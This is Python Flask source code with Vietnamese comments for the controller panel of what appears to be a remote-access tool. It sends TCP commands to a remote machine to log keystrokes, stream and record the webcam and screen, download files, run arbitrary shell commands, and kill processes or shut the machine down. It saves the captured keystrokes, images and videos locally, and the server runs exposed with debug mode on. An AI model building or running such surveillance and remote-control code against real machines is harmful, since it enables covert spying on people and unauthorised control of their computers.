from flask import Flask, render_template, request, jsonify, Response, send_file
import socket, json, os, struct, io, time
from datetime import datetime # Cần thêm lại thư viện này

TCP_SERVER_IP = "127.0.0.1" 
TCP_PORT = 5001

app = Flask(__name__)

# --- CONFIG ---
@app.route("/api/configure", methods=["POST"])
def configure():
    global TCP_SERVER_IP, TCP_PORT
    d = request.json
    if d.get("ip"): TCP_SERVER_IP = d.get("ip")
    if d.get("port"): TCP_PORT = int(d.get("port"))
    return jsonify({"status": "ok"})

@app.route("/api/config_info")
def get_conf(): return jsonify({"ip": TCP_SERVER_IP, "port": TCP_PORT})

@app.route("/api/ping")
def ping(): return jsonify({"status": "alive"})

# --- CORE TCP ---
def send_tcp(cmd, binary=False):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10) # Tăng timeout lên 10s để nhận file lớn
            s.connect((TCP_SERVER_IP, TCP_PORT))
            s.sendall(cmd.encode())
            
            if binary:
                # Nhận dữ liệu binary (file, ảnh, video)
                size_data = s.recv(4)
                if not size_data: return None
                size = struct.unpack(">L", size_data)[0]
                if size == 0: return None
                
                data = b""
                while len(data) < size:
                    packet = s.recv(min(40960, size - len(data))) # Buffer lớn hơn chút
                    if not packet: break
                    data += packet
                return data
            else:
                # Nhận text thường
                data = b""
                while True:
                    chunk = s.recv(4096)
                    if not chunk: break
                    data += chunk
                return data.decode(errors='ignore')
    except Exception as e: return None

# --- RESTORED FUNCTIONS (KHÔI PHỤC TÍNH NĂNG) ---
def save_screenshot_locally():
    try:
        img_data = send_tcp("download_screenshot", binary=True)
        if not img_data: return "[ERROR] Failed to download screenshot"
        
        os.makedirs("screenshots", exist_ok=True)
        filename = f"screenshots/shot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        
        with open(filename, "wb") as f:
            f.write(img_data)
        return f"Saved to: {os.path.abspath(filename)}"
    except Exception as e: return f"[ERROR] {e}"

def save_video_locally(seconds):
    try:
        # Gửi lệnh quay và chờ Server quay xong rồi gửi file về
        video_data = send_tcp(f"webcam_record {seconds}", binary=True)
        if not video_data: return "[ERROR] Failed to download video"
        
        os.makedirs("recordings", exist_ok=True)
        filename = f"recordings/video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        
        with open(filename, "wb") as f:
            f.write(video_data)
        return f"Saved to: {os.path.abspath(filename)}"
    except Exception as e: return f"[ERROR] {e}"

    # --- THÊM VÀO client.py ---

@app.route("/api/save_keylog_local", methods=["POST"])
def save_keylog_local():
    try:
        data = request.json
        content = data.get("content", "")
        
        # Tạo thư mục keylog nếu chưa có
        folder = "keylog"
        if not os.path.exists(folder):
            os.makedirs(folder)
            
        # Tạo tên file theo thời gian
        filename = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        filepath = os.path.join(folder, filename)
        
        # Ghi file
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)
            
        return jsonify({"status": "ok", "message": f"Saved to {filepath}"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# --- FEATURES ---

# 1. STREAMING
def gen_stream(cmd):
    while True:
        data = send_tcp(cmd, binary=True)
        if data: yield (b'--frame\r\n' b'Content-Type: image/jpeg\r\n\r\n' + data + b'\r\n')
        else: time.sleep(0.1)

@app.route('/video_feed_screen')
def vid_screen(): return Response(gen_stream("screen_stream"), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/video_feed_webcam')
def vid_cam(): return Response(gen_stream("webcam_stream"), mimetype='multipart/x-mixed-replace; boundary=frame')

# 2. FILE EXPLORER
@app.route("/api/files/list", methods=["POST"])
def list_files():
    path = request.json.get("path", ".")
    res = send_tcp(f"list_dir {path}")
    return Response(res, mimetype='application/json')

@app.route("/api/files/download")
def download_file():
    path = request.args.get("path")
    data = send_tcp(f"get_file {path}", binary=True)
    if data:
        return send_file(io.BytesIO(data), as_attachment=True, download_name=os.path.basename(path))
    return "Error downloading file", 404

# 3. TERMINAL
@app.route("/api/terminal", methods=["POST"])
def terminal_exec():
    cmd = request.json.get("cmd")
    res = send_tcp(f"shell {cmd}")
    return jsonify({"output": res})

# 4. STATS & PROCESSES
@app.route("/api/stats")
def sys_stats():
    res = send_tcp("sys_stats")
    return Response(res, mimetype='application/json')

@app.route("/api/processes")
def proc_list():
    res = send_tcp("list_processes_json")
    return Response(res, mimetype='application/json')

@app.route("/api/apps")
def app_list():
    res = send_tcp("list_apps")
    return Response(res, mimetype='application/json')

@app.route("/keylogger_data")
def keylog_data():
    return jsonify({"keys": send_tcp("keylog_data")})

# --- CONTROL ---
@app.route("/control", methods=["POST"])
def control():
    d = request.json
    act = d.get("action")
    
    cmd = ""
    result = "Executed"

    # Xử lý Screenshot (Lưu local)
    if act == "screenshot":
        result = save_screenshot_locally()
        return jsonify({"status": "ok" if "[ERROR]" not in result else "error", "message": result})
    
    # Xử lý Webcam Record (Lưu local)
    elif act == "webcam_record":
        seconds = d.get("seconds", 5)
        result = save_video_locally(seconds)
        return jsonify({"status": "ok" if "[ERROR]" not in result else "error", "message": result})

    # Các lệnh khác
    map_cmd = {
        "keylog_start": "keylog_start", "keylog_stop": "keylog_stop", "keylog_clear": "keylog_clear",
        "shutdown": "shutdown", "restart": "restart"
    }
    
    if act in map_cmd: cmd = map_cmd[act]
    elif act == "kill_process": cmd = f"kill_process {d.get('pid')}"
    elif act in ["start", "stop"]: cmd = f"{act} {d.get('app')}"
    elif act == "disconnect": cmd = "disconnect"
    
    if cmd:
        res_server = send_tcp(cmd)
        if res_server: result = res_server

    return jsonify({"status": "ok", "message": result})

# --- PAGES ---
@app.route("/")
def index(): return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=True)